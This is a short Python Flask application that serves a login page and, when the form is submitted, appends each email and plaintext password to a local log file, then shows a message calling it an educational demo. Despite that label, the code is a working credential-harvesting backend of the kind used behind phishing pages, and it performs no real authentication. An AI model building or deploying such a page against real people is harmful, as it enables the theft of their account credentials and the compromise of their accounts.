from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    with open('log.txt', 'a') as f:
        f.write(f"Email: {email}, Password: {password}\n")

    return "<h2>This is a demo. Credentials have been logged locally for educational purposes only.</h2>"

if __name__ == '__main__':
    app.run(debug=True)
